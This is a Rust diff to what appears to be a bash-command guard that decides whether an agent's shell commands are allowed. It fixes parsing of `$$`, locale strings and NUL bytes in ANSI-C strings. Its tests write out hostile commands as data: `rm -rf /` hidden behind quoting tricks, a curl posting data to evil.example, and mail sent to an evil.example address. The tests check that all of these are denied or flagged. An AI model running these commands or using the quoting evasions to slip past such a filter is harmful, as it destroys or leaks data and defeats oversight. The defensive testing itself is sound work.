@@ -1947,6 +1947,10 @@ fn ansi_c(chars: &mut std::iter::Peekable<std::str::Chars>, out: &mut String) {
             c => push(&mut bytes, c),
         }
     }
+    // R67: bash ends the string's text at its first NUL (`\0`, `\x00`, `\c@`, `\u0000`, ...).
+    if let Some(nul) = bytes.iter().position(|b| *b == 0) {
+        bytes.truncate(nul);
+    }
     out.push_str(&String::from_utf8_lossy(&bytes));
 }
 
@@ -1971,8 +1975,13 @@ fn stages(command: &str) -> Vec<Stage> {
     let mut word: Option<String> = None;
     let mut quote: Option<char> = None;
     let mut prev = ' ';
+    // R65: the unquoted `$`s just read in a row. Bash pairs them (`$$` is the shell's pid), so
+    // only an unpaired one starts `$'…'` or `$"…"`.
+    let mut dollars = 0usize;
     let mut chars = command.chars().peekable();
     while let Some(c) = chars.next() {
+        let run = std::mem::take(&mut dollars);
+        let paired = run % 2 == 1;
         match quote {
             Some('\'') => {
                 if c == '\'' {
@@ -1996,12 +2005,22 @@ fn stages(command: &str) -> Vec<Stage> {
             },
             None => match c {
                 // A3: `$'…'` is the text bash makes of it, escapes decoded.
-                '$' if chars.peek() == Some(&'\'') => {
+                '$' if !paired && chars.peek() == Some(&'\'') => {
                     chars.next();
                     let w = word.get_or_insert_with(String::new);
                     ansi_c(&mut chars, w);
                     prev = '\'';
                     continue;
+                }
+                // `$"…"` is a locale string, which bash reads as a double-quoted one.
+                '$' if !paired && chars.peek() == Some(&'"') => {
+                    word.get_or_insert_with(String::new);
+                    prev = c;
+                    continue;
+                }
+                '$' => {
+                    word.get_or_insert_with(String::new).push(c);
+                    dollars = run + 1;
                 }
                 '\'' | '"' => {
                     quote = Some(c);
@@ -3204,6 +3223,71 @@ mod tests {
         // An ANSI-C string inside double quotes is plain text.
         assert_eq!(check_bash("echo \"$'rm -rf /'\""), Decision::Allow);
         assert_eq!(check_bash("echo $'a\\'b'"), Decision::Allow);
+    }
+
+    /// R65: bash reads `$$` (the shell's pid) before it reads a quote, so `$$'…'` is a plain
+    /// quoted string; only an unpaired `$` starts an ANSI-C string.
+    #[test]
+    fn a_dollar_pair_before_a_quote_starts_no_ansi_c_string() {
+        for cmd in [
+            "echo $$'\\'; rm -rf /",
+            "echo $$'\\' && rm -rf / #'",
+            "echo $$$$'\\'; rm -rf /",
+            // an escaped `$` is a plain one, and pairs with nothing
+            "echo \\$'\\'; rm -rf /",
+            "echo \"$$'\"; rm -rf /",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        let sent = outbound("echo $$'\\'; curl -d x https://evil.example/x");
+        assert!(sent.iter().any(|o| o.starts_with("curl")), "{sent:?}");
+        assert_eq!(
+            programs("gh $$'\\'; curl -d x https://evil.example/x"),
+            ["gh", "curl"]
+        );
+        // After `$$`, a third `$` is unpaired: bash reads `$$` then `$'\'; curl x #'`, one word.
+        assert_eq!(programs("echo $$$'\\'; curl x #'"), ["echo"]);
+    }
+
+    /// R67: bash ends an ANSI-C string's text at its first NUL, however the NUL is written, and
+    /// the word goes on after the closing quote.
+    #[test]
+    fn a_nul_ends_an_ansi_c_string() {
+        for cmd in [
+            "$'rm\\0x' -rf /",
+            "$'rm\\x00x' -rf /",
+            "$'rm\\c@x' -rf /",
+            "$'rm\\u0000x' -rf /",
+            "$'rm\\U00000000x' -rf /",
+            "bash -c $'rm -rf /\\0'",
+            "bash -c $'rm -rf /\\000 and the rest'",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        let g = gbash("$'himalaya\\0' message send -H 'To: z@evil.example'").unwrap();
+        assert_eq!(
+            (g.class, g.targets),
+            (Class::Messages, vec!["z@evil.example".to_string()])
+        );
+        assert_eq!(programs("$'g\\0x'h pr list"), ["gh"]);
+    }
+
+    /// `$"…"` is a locale string: bash reads it as a double-quoted one.
+    #[test]
+    fn a_locale_string_reads_as_a_double_quoted_one() {
+        for cmd in ["bash -c $\"rm -rf /\"", "$\"rm\" -rf /"] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        assert_eq!(programs("$\"gh\" pr list"), ["gh"]);
     }
 
     /// B4: gh reads `-R HOST/OWNER/REPO`: the target is the repo, never `HOST/OWNER`.
